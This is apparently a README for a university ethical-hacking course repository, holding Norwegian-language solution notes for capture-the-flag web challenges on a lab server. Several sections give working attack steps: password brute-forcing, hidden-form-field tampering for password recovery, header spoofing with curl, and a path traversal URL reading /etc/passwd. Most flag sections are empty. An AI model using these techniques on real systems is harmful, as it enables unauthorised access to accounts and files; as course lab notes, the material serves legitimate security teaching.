# TTM4536-Etisk-hacking

Repo for all code som blir brukt i faget, og spesielt i forhold til flag og Darkly


Flags:
1. Bruteforce
2. Passord-recovery
3. Albatros-flag? nsa?
4. Survey (trenger flag03)
5. Redirect (trenger flag04)
6. Paths
7. Hidden
8. Whatever
9. Cookies/oreo
10. Members
11. Image
12. Image2
13. Silly
14. nsa2



# Bruteforce/Flag01

Lagde et script som kjørte 2 for løkker. Begge løkkene gikkgjennom alle passordene i filen (xato.....) og i den inerste løkken skrev den ut passordene i et passord. Så alle passordene i filen ble satt sammen med alle passordene inkludert seg selv. Det endte totalt med 998001 passord grunnet at det var 999 passord i filen siden et av passordene var blankt som scriptet ikke tok med.

Etter det kjørte jeg det default scriptet med noen små justeringer og fikk ut passordet (chicken333333) for admin.


# Flag02 - Passord recovery
Editerte html coden:
Ved å legge inn eget e-post i value i stede for den som lå der orginalt
```
<form action="#" method="POST"> 
    <input type="hidden" name="mail" value="eirikgba@stud.ntnu.no" maxlength="15"> 
    <input type="submit" name="Submit" value="Submit"> 
</form>
```


# Flag03 - Albatros/NSA flag
``` 
curl -A "61c08546b939" -e "https://www.nsa.gov/" http://129.241.200.165:19680/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
```

# Flag04 - Survey
```
http://129.241.200.165:19680/?page=survey
<form action="#" method="post">
					<input type="hidden" name="sujet" value="2">
					<select name="valeur" onchange="javascript:this.form.submit();">
						<option value="1">1</option>
						<option value="2">2</option>
						<option value="3">3</option>
						<option value="4">4</option>
						<option value="5">5</option>
						<option value="6">6</option>
						<option value="7">7</option>
						<option value="8">8</option>
						<option value="9">9</option>
						<option value="999999">10</option>
					</select>
				</form>

```
Change the value of one of the Grades

2^Grade mod p = FLAG03 mod 2^64,
Where
p = Next_Prime(2^54)

# Flag05

# Flag06
Endre page, ved å gå til root og så inn i directory etc og vidre inn i passwd.
Hentet opp deller av flagget når en går bakover i fil systemet og det siste ligger i etc/passwd
```
http://129.241.200.165:19680/index.php?page=../../../../../../../etc/passwd
```


# Flag07
Flag07: dbfa4f7c46dc570fcd4b71272cdd2f2c
First tok jeg ut alle README filene
``` 
wget -m -r -nd -A "*README*" http://129.241.200.165:19680//.hidden/ 
```
Så merge alle filene sammen til en fil og åpne den filen i notepad
```
cat * > merged-file
explorer.exe .			#åpner directory i file explorer windows
```

# Flag08

# Flag09

# Flag10

# Flag11

# Flag12

# Flag13

# Flag14

